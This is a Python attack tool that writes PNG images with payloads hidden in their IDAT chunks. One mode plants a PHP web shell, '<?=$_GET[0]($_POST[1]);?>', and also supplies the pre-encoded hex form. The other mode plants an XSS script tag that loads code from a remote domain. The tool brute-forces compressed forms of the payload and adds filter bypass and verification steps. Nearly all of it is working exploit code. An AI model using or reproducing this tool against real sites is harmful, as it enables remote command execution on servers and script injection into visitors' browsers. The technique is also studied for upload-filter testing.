#!/usr/bin/env python3
"""
Author: TheZero
Based off of code and concepts:
    Hunter Gregal -- https://github.com/huntergregal/PNG-IDAT-Payload-Generator
    Adam Logue -- https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks
    IDontPlayDarts -- https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks
    fin1te -- https://whitton.io/articles/xss-on-facebook-via-png-content-types
    Vavkamil -- https://github.com/vavkamil/PNG-IDAT-chunks
Payloads:
    WebShell: <?=$_GET[0]($_POST[1]);?>
    XSS:    Varies alot. Easier with short remote include -- aka <SCRIPT src=//LOG.BZ><script>
"""
from idat import bypass_filters, save_image, verify
from utils import domain_parse, domain_brute
import argparse

parser = argparse.ArgumentParser(description="Tool to generate PNG-IDAT Payloads.")

parser.add_argument("-q", "--quiet", dest="quiet", help="Optional: quiet mode", action="store_true", default=False)
parser.add_argument("-m", "--method", dest="method", help="Choose payload method, -h to view available methods", choices=["xss", "php"], required=True, type=str)
parser.add_argument("-r", "--remote-domain", dest="remote_domain", help="Remote domain to retrieve payload from (shorter the better: ex. xx.xxx. use xqi.cc for generic XSS)", type=str)
parser.add_argument("-o", "--output-file", dest="output_image", help="Output payload to PNG file", required=True, type=str)
# Size not supported!
#parser.add_argument("-s", "--size", dest="output_size", help="Output size/ratio for image. (ex: 1000x1000)", required=False, type=str)
parser.add_argument("-u", "--update", dest="update", help="Update the payload tables", required=False, default=False)
parser.add_argument("-p", "--payload", dest="payload", help="Use the provided payload - no bruteforce", required=False, default=False)
parser.add_argument("-t", "--threads", dest="threads", help="Number of threads to use for bruteforce", required=False, default=4, type=int)
args = parser.parse_args()

def quiet(*args, **kwargs):
    return


if __name__ == "__main__":
    method = args.method
    output_image = args.output_image if '.png' in args.output_image else args.output_image + '.png'

    if args.quiet:
        print = quiet

    #if args.output_size:
    #    w, h = [int(c) for c in args.output_size.split('x')]
    #    output_size = (w,h)
    #else:
    #    output_size = (32,32)
    output_size = (32,32)

    text_payload = b""
    payload = b""
    if "xss" in method:
        if not args.remote_domain:
            print("[+] XSS Method Requires remote-domain")
            exit(1)
        remote_domain = (args.remote_domain).upper()
        prefix, tld = domain_parse(remote_domain)
        text_payload = "<SCRIPT SRC=//{}></script>".format(remote_domain).encode()
        if args.payload:
            payload = args.payload
        else:
            # Bruteforce gzdeflate payload
            payload = domain_brute(remote_domain, prefix, tld, update=args.update, threads=args.threads)
        # If failed, quit
        if not payload:
            print("[+] Payload Failed to Generate...exiting")
            exit(1)
    elif "php" in method:
        # PHP payload
        print("[+] PHP Method Selected. Using 'idontplaywithdarts' payload")
        text_payload = b"<?=$_GET[0]($_POST[1]);?>"
        payload = b"a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310"
        print("[-] Payload String: {}".format(text_payload))
        print("[-] Payload: {}".format(payload))

    filterproof = bypass_filters(payload)
    save_image(filterproof, output_image, output_size=output_size)
    print("[-] Generated Image {}".format(output_image))
    if text_payload != b"":
        print("[-] Verifying payload")
        verify(output_image, text_payload)
        print("[-] Payload OK")
    print("[+] Fin")
